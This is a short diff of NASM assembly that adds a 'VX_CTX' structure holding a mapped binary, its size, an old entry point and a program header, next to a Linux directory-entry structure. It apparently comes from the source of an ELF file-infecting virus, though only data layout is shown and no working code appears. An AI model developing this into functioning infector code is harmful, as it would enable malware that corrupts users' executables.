@@ -1,3 +1,12 @@
+
+struc VX_CTX   
+    .qMappedBin    resq 0x01  ; 0x00
+    .qFileSize     resq 0x01  ; 0x08
+    .qOldEntry     resq 0x01  ; 0x10
+    .qPrgHdr       resq 0x01  ; 0x18
+    .qEof          resq 0x01  ; 0x20
+endstruc
+
 struc linux_dirent64
     .d_ino          resq 0x01
     .d_off          resq 0x01
